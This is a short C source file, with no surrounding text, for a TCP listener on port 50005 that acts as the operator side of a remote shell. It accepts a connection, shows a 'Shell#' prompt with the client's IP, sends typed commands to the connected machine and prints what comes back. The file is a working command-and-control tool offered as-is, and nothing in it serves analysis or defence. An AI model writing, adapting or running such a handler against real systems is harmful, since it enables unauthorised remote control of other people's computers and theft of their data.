#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>

int main() {


   int server_socket = socket(AF_INET, SOCK_STREAM, 0);
   if (server_socket == -1) {
       printf("Socket creation failed\n");
       return 1;
   }

   struct sockaddr_in server_address;
   server_address.sin_family = AF_INET;
   server_address.sin_port = htons(50005);
   server_address.sin_addr.s_addr = INADDR_ANY;

   if (bind(server_socket, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
       printf("Bind failed\n");
       return 1;
   }

   if (listen(server_socket, 3) < 0) {
       printf("Listen failed\n");
       return 1;
   }

   struct sockaddr_in client_address;
   socklen_t client_length = sizeof(client_address);
   int client_socket = accept(server_socket, (struct sockaddr*)&client_address, &client_length);
   if (client_socket < 0) {
       printf("Accept failed\n");
       return 1;
   }
   
   
    char buff[1024];
    char res[18384];
   
    while (1) {

	    bzero(&buff, sizeof(buff));
	    bzero(&res, sizeof(res));

	    printf("* Shell#%s~$: \n", inet_ntoa(client_address.sin_addr));

	    fgets(buff, sizeof(buff), stdin);
	    strtok(buff, "\n");
	    write(client_socket, buff, sizeof(buff));
	
	if (strncmp("q", buff, 1) == 0) {
	printf("ended\n");
	      	break;
	    }
	else{
		recv(client_socket, res, sizeof(res), MSG_WAITALL);
        printf("%s", res);
	}
	    

	  

   
	}
    close(client_socket);
	return 0;
}
